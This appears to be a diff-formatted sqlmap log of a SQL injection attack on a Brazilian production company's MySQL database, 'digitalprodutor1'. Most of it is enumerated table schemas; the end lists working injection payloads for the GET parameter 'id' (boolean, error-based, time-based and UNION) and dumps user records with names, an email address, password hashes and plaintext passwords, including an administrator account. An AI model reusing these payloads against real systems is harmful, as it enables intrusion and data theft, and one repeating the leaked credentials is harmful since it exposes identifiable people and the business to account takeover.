+| Column        | Type         |
++---------------+--------------+
+| config_campo  | varchar(250) |
+| config_id     | int(11)      |
+| config_label  | varchar(250) |
+| config_status | int(2)       |
+| config_valor  | longtext     |
++---------------+--------------+
+
+Database: digitalprodutor1
+Table: events
+[6 columns]
++------------+--------------+
+| Column     | Type         |
++------------+--------------+
+| end_date   | datetime     |
+| id         | int(11)      |
+| readonly   | varchar(2)   |
+| start_date | datetime     |
+| subject    | varchar(11)  |
+| text       | varchar(255) |
++------------+--------------+
+
+Database: digitalprodutor1
+Table: banco2
+[14 columns]
++---------------+--------------+
+| Column        | Type         |
++---------------+--------------+
+| bb_ag         | varchar(250) |
+| bb_balancete  | varchar(250) |
+| bb_desc       | varchar(250) |
+| bb_despesa    | int(15)      |
+| bb_documento  | varchar(250) |
+| bb_historico  | varchar(250) |
+| bb_id         | int(15)      |
+| bb_lote       | varchar(250) |
+| bb_movimento  | date         |
+| bb_movimento2 | varchar(250) |
+| bb_tipo       | int(11)      |
+| bb_tipo2      | varchar(2)   |
+| bb_valor      | decimal(8,2) |
+| bb_valor2     | varchar(250) |
++---------------+--------------+
+
+Database: digitalprodutor1
+Table: events_datas
+[6 columns]
++--------------+--------------+
+| Column       | Type         |
++--------------+--------------+
+| data_data    | date         |
+| data_feriado | int(11)      |
+| data_id      | int(11)      |
+| data_nome    | varchar(250) |
+| data_repete  | int(11)      |
+| data_tipo    | int(11)      |
++--------------+--------------+
+
+Database: digitalprodutor1
+Table: acesso_menu
+[4 columns]
++--------------+--------------+
+| Column       | Type         |
++--------------+--------------+
+| menu_icone   | varchar(50)  |
+| menu_id      | int(11)      |
+| menu_nome    | varchar(250) |
+| menu_posicao | int(1)       |
++--------------+--------------+
+
+Database: digitalprodutor1
+Table: financeiro_fornecedor
+[7 columns]
++-----------------------------+--------------+
+| Column                      | Type         |
++-----------------------------+--------------+
+| financeiro_fornecedor_banco | mediumtext   |
+| financeiro_fornecedor_email | varchar(250) |
+| financeiro_fornecedor_fone  | varchar(250) |
+| financeiro_fornecedor_id    | int(15)      |
+| financeiro_fornecedor_nome  | varchar(250) |
+| financeiro_fornecedor_obs   | mediumtext   |
+| financeiro_fornecedor_tipo  | int(2)       |
++-----------------------------+--------------+
+
+Database: digitalprodutor1
+Table: banco_link
+[4 columns]
++-----------------+----------+
+| Column          | Type     |
++-----------------+----------+
+| link_banco      | int(11)  |
+| link_data       | datetime |
+| link_financeiro | int(11)  |
+| link_id         | int(11)  |
++-----------------+----------+
+
+Database: digitalprodutor1
+Table: grupo
+[4 columns]
++---------------+--------------+
+| Column        | Type         |
++---------------+--------------+
+| grupo_id      | int(11)      |
+| grupo_nome    | varchar(250) |
+| grupo_tipo    | int(11)      |
+| grupo_usuario | int(11)      |
++---------------+--------------+
+
+Database: digitalprodutor1
+Table: acesso
+[14 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| acesso_1       | tinyint(4)   |
+| acesso_2       | tinyint(4)   |
+| acesso_3       | tinyint(4)   |
+| acesso_4       | tinyint(4)   |
+| acesso_5       | tinyint(4)   |
+| acesso_del     | tinyint(4)   |
+| acesso_edit    | tinyint(4)   |
+| acesso_id      | int(11)      |
+| acesso_link    | varchar(250) |
+| acesso_new     | tinyint(4)   |
+| acesso_nome    | varchar(250) |
+| acesso_pagina  | varchar(250) |
+| acesso_posicao | int(1)       |
+| acesso_tipo    | int(11)      |
++----------------+--------------+
+
+Database: digitalprodutor1
+Table: funil
+[9 columns]
++----------------------+----------+
+| Column               | Type     |
++----------------------+----------+
+| funil_agencia        | int(11)  |
+| funil_cliente        | int(11)  |
+| funil_data           | date     |
+| funil_etapa          | int(11)  |
+| funil_historico_data | datetime |
+| funil_id             | int(11)  |
+| funil_index_data     | datetime |
+| funil_status         | int(11)  |
+| funil_usuario        | int(11)  |
++----------------------+----------+
+
+Database: digitalprodutor1
+Table: ordem
+[22 columns]
++-----------------+--------------+
+| Column          | Type         |
++-----------------+--------------+
+| bairro          | varchar(250) |
+| cep             | varchar(15)  |
+| cidade          | varchar(250) |
+| cms             | char(2)      |
+| cnpj            | varchar(25)  |
+| dadosfatura     | int(1)       |
+| dataentrada     | date         |
+| endereco        | varchar(250) |
+| estado          | varchar(20)  |
+| id              | int(15)      |
+| id_orcamento    | int(15)      |
+| insc            | varchar(25)  |
+| nota            | char(2)      |
+| outros          | longtext     |
+| prazo           | varchar(150) |
+| razao           | varchar(250) |
+| recebido        | varchar(25)  |
+| taxaimposto     | int(11)      |
+| titulo          | varchar(250) |
+| uf              | varchar(4)   |
+| valor_comissao  | decimal(8,2) |
+| valor_comissao2 | varchar(250) |
++-----------------+--------------+
+
+Database: digitalprodutor1
+Table: orcamento_desc_item
+[3 columns]
++---------------+----------+
+| Column        | Type     |
++---------------+----------+
+| desc_item_id  | int(11)  |
+| desc_item_orc | int(15)  |
+| desc_item_txt | longtext |
++---------------+----------+
+
+Database: digitalprodutor1
+Table: funil_acao
+[7 columns]
++-------------------+--------------+
+| Column            | Type         |
++-------------------+--------------+
+| funil_acao_css    | varchar(250) |
+| funil_acao_desc   | varchar(250) |
+| funil_acao_icone  | varchar(250) |
+| funil_acao_id     | int(11)      |
+| funil_acao_indice | int(11)      |
+| funil_acao_nome   | varchar(250) |
+| funil_acao_text   | varchar(250) |
++-------------------+--------------+
+
+Database: digitalprodutor1
+Table: usuario
+[7 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| atendimento | int(11)      |
+| codusuario  | int(15)      |
+| email       | varchar(30)  |
+| funcao      | varchar(30)  |
+| nivel       | varchar(20)  |
+| nome        | varchar(35)  |
+| senha       | varchar(250) |
++-------------+--------------+
+
+Database: digitalprodutor1
+Table: financeiro_banco_itens
+[4 columns]
++------------------+--------------+
+| Column           | Type         |
++------------------+--------------+
+| banco_itens_id   | int(11)      |
+| banco_itens_nome | varchar(250) |
+| banco_itens_obs  | varchar(250) |
+| banco_itens_tipo | int(2)       |
++------------------+--------------+
+
+Database: digitalprodutor1
+Table: contato
+[20 columns]
++---------------------+--------------+
+| Column              | Type         |
++---------------------+--------------+
+| contato_aniversario | date         |
+| contato_cargo       | varchar(250) |
+| contato_cidade      | int(10)      |
+| contato_data        | date         |
+| contato_email1      | varchar(250) |
+| contato_email2      | varchar(250) |
+| contato_email3      | varchar(250) |
+| contato_empresa     | varchar(250) |
+| contato_fone1       | varchar(250) |
+| contato_fone2       | varchar(250) |
+| contato_fone3       | varchar(250) |
+| contato_foto        | varchar(250) |
+| contato_id          | int(11)      |
+| contato_nome        | varchar(250) |
+| contato_obs         | mediumtext   |
+| contato_sobrenome   | varchar(250) |
+| contato_social1     | mediumtext   |
+| contato_social2     | mediumtext   |
+| contato_social3     | mediumtext   |
+| contato_tipo        | int(10)      |
++---------------------+--------------+
+
+Database: digitalprodutor1
+Table: orcamento
+[12 columns]
++------------+--------------+
+| Column     | Type         |
++------------+--------------+
+| data       | date         |
+| entrega    | date         |
+| estado     | varchar(30)  |
+| id         | int(15)      |
+| id_agencia | int(15)      |
+| id_cliente | int(15)      |
+| pagamento  | varchar(250) |
+| tempo      | time         |
+| tipo       | varchar(150) |
+| usuario    | int(4)       |
+| validade   | date         |
+| valortotal | decimal(8,2) |
++------------+--------------+
+
+Database: digitalprodutor1
+Table: banco_forma
+[7 columns]
++------------------+--------------+
+| Column           | Type         |
++------------------+--------------+
+| forma_banco      | int(11)      |
+| forma_desc       | varchar(250) |
+| forma_fornecedor | int(11)      |
+| forma_id         | int(11)      |
+| forma_nome       | varchar(250) |
+| forma_num        | int(11)      |
+| forma_tipo       | int(11)      |
++------------------+--------------+
+
+Database: digitalprodutor1
+Table: item
+[3 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| id          | int(15)      |
+| item        | varchar(250) |
+| item_padrao | int(11)      |
++-------------+--------------+
+
+Database: digitalprodutor1
+Table: funil_status
+[7 columns]
++---------------------+--------------+
+| Column              | Type         |
++---------------------+--------------+
+| funil_status_class  | varchar(250) |
+| funil_status_color1 | varchar(6)   |
+| funil_status_color2 | varchar(6)   |
+| funil_status_color3 | varchar(6)   |
+| funil_status_id     | int(11)      |
+| funil_status_index  | int(11)      |
+| funil_status_nome   | varchar(250) |
++---------------------+--------------+
+
+Database: digitalprodutor1
+Table: backup
+[4 columns]
++-------------+------------+
+| Column      | Type       |
++-------------+------------+
+| backup_data | datetime   |
+| backup_exec | datetime   |
+| backup_id   | int(15)    |
+| backup_sql  | mediumtext |
++-------------+------------+
+
+Database: digitalprodutor1
+Table: cliente
+[20 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| bairro      | varchar(150) |
+| celular     | varchar(15)  |
+| cep         | varchar(150) |
+| cidade      | varchar(150) |
+| cnpj_cpf    | varchar(150) |
+| complemento | varchar(150) |
+| datacli     | datetime     |
+| email       | varchar(150) |
+| estado      | varchar(15)  |
+| fax         | varchar(150) |
+| fone        | varchar(150) |
+| id          | int(15)      |
+| insc_rg     | varchar(150) |
+| logo        | varchar(250) |
+| nome        | varchar(250) |
+| numero      | int(15)      |
+| ramal       | int(15)      |
+| razao       | varchar(250) |
+| rua         | varchar(250) |
+| tipo        | varchar(50)  |
++-------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 9575=9575
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 4649 FROM(SELECT COUNT(*),CONCAT(0x7171626271,(SELECT (ELT(4649=4649,1))),0x716b6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 18 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171626271,0x6743465166464d6b6167504c6f52446e744f676e506f6a4f765664554c554f54596e614a684a7078,0x716b6b6271),NULL,NULL,NULL-- ZQfZ
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: digitalprodutor1
+Table: usuario
+[4 entries]
++----------+-------+--------------------------------------------------------------+--------------------------------+------------+------------+-------------+
+| nome     | nivel | senha                                                        | email                          | funcao     | codusuario | atendimento |
++----------+-------+--------------------------------------------------------------+--------------------------------+------------+------------+-------------+
+| Wilker   | 1     | $2y$10$HFUK/AXLqGgKZh.0jq01IeszMjK.XhKph3jEPjayj4m1WSLtgYkK. | wilker@digitalprodutora.com.br | WebMaster  | 1          | 1           |
+| Daniela  | 1     | digitalmf                                                    | <blank>                        | Produção   | 5          | 0           |
+| Silvia   | 3     | $2y$10$lDjHktG6ngnqJ/mZY3uRieVoWPCHa7Nr9C2yoxBuv9pLXzZhfwfP6 | NULL                           | NULL       | 21         | 1           |
+| Cristina | 2     | $2y$10$tJn7toE9Q/YKqlwsKRq3tu/NODIOdYbACWWq/1cyvsmTAoBM8P9R6 | NULL                           | Financeiro | 22         | 0           |
++----------+-------+--------------------------------------------------------------+--------------------------------+------------+------------+-------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 9575=9575
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 4649 FROM(SELECT COUNT(*),CONCAT(0x7171626271,(SELECT (ELT(4649=4649,1))),0x716b6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 18 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171626271,0x6743465166464d6b6167504c6f52446e744f676e506f6a4f765664554c554f54596e614a684a7078,0x716b6b6271),NULL,NULL,NULL-- ZQfZ
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: digitalprodutora
+Table: administrador
+[1 entry]
++----+-----------+-------+-------+-------+
+| id | tipo      | nome  | senha | email |
++----+-----------+-------+-------+-------+
+| 9  | Webmaster | admin | 123   | admin |
++----+-----------+-------+-------+-------+
+
